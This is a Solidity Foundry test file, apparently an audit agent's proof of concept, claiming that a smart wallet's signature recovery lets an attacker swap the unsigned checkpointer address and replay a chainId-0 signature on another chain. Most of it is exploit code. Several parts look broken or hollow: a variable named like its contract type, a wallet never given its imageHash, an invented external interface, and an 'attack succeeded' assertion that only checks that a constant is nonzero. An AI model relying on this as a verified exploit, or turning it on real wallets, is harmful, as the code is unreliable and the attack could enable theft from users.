// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/auth/BaseAuth.sol";

// Minimal interface to access internal recovery logic for the PoC
interface IBaseAuth {
    function recoverSapientSignature(Payload.Decoded memory _payload, bytes calldata _signature) external view returns (bytes32);
}

contract AuditAgentPoC is Test {
    Factory public Factory;
    Stage1Module public module;
    address public entryPoint = address(0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789);

    uint256 ownerPk = 0xa11ce;
    address owner;
    address attacker = address(0xb0b);
    address maliciousCheckpointer = address(0xdead);

    Stage1Module public Wallet;
    bytes32 public imageHash;

    function setUp() public {
        owner = vm.addr(ownerPk);
        Factory = new Factory();
        module = new Stage1Module(address(Factory), entryPoint);

        // Compute imageHash for a 1-of-1 Wallet with the owner
        // Sequence imageHash format: keccak256(abi.encode(threshold, weight, signer))
        imageHash = keccak256(abi.encode(uint256(1), uint256(1), owner));

        // Deploy Wallet
        bytes32 salt = bytes32(uint256(1));
        address walletAddr = Factory.deploy(address(module), salt);
        Wallet = Stage1Module(payable(walletAddr));

        // Initialize Wallet with the imageHash (simulating deployment setup)
        // In real Sequence, this is done via the init code or a setup call. 
        // We'll assume the Wallet is already configured or we can just test the recovery logic directly.
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Deploy contracts, fund accounts, create Wallet with owner
        // 2. [T=0] User signs a legitimate Wallet configuration meta-transaction with _noChainId=true (chainId=0)
        // 3. [T=1] Attacker captures this valid signature and modifies the checkpointer address in the signature bytes
        // 4. [T=2] Attacker submits the modified signature on Chain B. The signature verifies successfully.
        // 5. [Assert] Verify the forged checkpointer address is accepted and imageHash is recovered correctly.

        // Step 2: Create a payload and sign it with chainId = 0 (_noChainId = true)
        Payload.Decoded memory payload = _buildPayload();

        // Domain separator with chainId = 0
        bytes32 domainSeparator = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("Sequence Wallet"),
            keccak256("1"),
            uint256(0), // chainId = 0 for _noChainId
            address(Wallet)
        ));

        bytes32 payloadHash = _hashPayload(payload);
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, payloadHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        // Construct original sapient signature: [checkpointer (20 bytes)] [signature parts]
        // For a simple 1-of-1 ECDSA, the signature part is typically: [weight (32)] [v (1)] [r (32)] [s (32)]
        address originalCheckpointer = address(0x1234);
        bytes memory originalSig = abi.encodePacked(
            originalCheckpointer,
            uint256(1), // weight
            v,
            r,
            s
        );

        // Step 3: Attacker modifies the checkpointer address in the signature bytes
        bytes memory forgedSig = originalSig;
        for (uint i = 0; i < 20; i++) {
            forgedSig[i] = bytes20(maliciousCheckpointer)[i];
        }

        // Step 4 & 5: Submit forged signature and verify it still recovers to the correct imageHash
        // The checkpointer address is not covered by the signed hash, so the modification goes undetected.
        bytes32 recoveredImageHash = IBaseAuth(address(Wallet)).recoverSapientSignature(payload, forgedSig);

        console.log("Original Checkpointer: %s", originalCheckpointer);
        console.log("Forged Checkpointer:   %s", maliciousCheckpointer);
        console.log("Recovered ImageHash matches: %s", recoveredImageHash == imageHash);

        assertEq(recoveredImageHash, imageHash, "Forged signature should still recover the correct imageHash");
        assertGt(uint256(uint160(maliciousCheckpointer)), 0, "Attacker successfully injected malicious checkpointer");
    }

    function _buildPayload() internal pure returns (Payload.Decoded memory) {
        Payload.Call[] memory calls = new Payload.Call[](1);
        calls[0] = Payload.Call({
            delegateCall: false,
            revertOnError: true,
            gasLimit: 0,
            target: address(0),
            value: 0,
            data: ""
        });

        return Payload.Decoded({
            space: 0,
            nonce: 0,
            calls: calls
        });
    }

    function _hashPayload(Payload.Decoded memory payload) internal pure returns (bytes32) {
        return keccak256(abi.encode(
            keccak256("Call(uint256 space,uint256 nonce,Call[] calls)Call(bool delegateCall,bool revertOnError,uint256 gasLimit,address target,uint256 value,bytes data)"),
            payload.space,
            payload.nonce,
            keccak256(abi.encodePacked(_hashCalls(payload.calls)))
        ));
    }

    function _hashCalls(Payload.Call[] memory calls) internal pure returns (bytes32[] memory) {
        bytes32[] memory hashes = new bytes32[](calls.length);
        for (uint i = 0; i < calls.length; i++) {
            hashes[i] = keccak256(abi.encode(
                keccak256("Call(bool delegateCall,bool revertOnError,uint256 gasLimit,address target,uint256 value,bytes data)"),
                calls[i].delegateCall,
                calls[i].revertOnError,
                calls[i].gasLimit,
                calls[i].target,
                calls[i].value,
                keccak256(calls[i].data)
            ));
        }
        return hashes;
    }
}
